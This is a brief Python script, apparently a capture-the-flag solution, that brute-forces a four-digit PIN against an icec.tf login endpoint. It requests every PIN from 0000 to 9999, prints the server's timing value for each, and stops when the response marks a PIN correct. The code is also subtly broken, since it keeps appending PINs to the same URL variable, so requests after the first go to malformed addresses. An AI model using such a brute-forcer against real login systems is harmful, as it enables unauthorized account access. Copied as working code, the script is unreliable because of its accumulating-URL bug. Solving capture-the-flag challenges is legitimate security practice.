```python
#http://www.misc-pin.vuln.icec.tf/login/2222
import requests

url = "http://www.misc-pin.vuln.icec.tf/login/"
num = 1

for i in range(0, 10000):
	url = url + str(i).zfill(4)
	r=requests.get(url)
	data = r.json()
	if data["correct"]:
		print(r.text)
		exit(1)
	else:
		print("Pin " + str(i).zfill(4) + " " + str(data['time']))
	num+=1
	print(r.text)
```
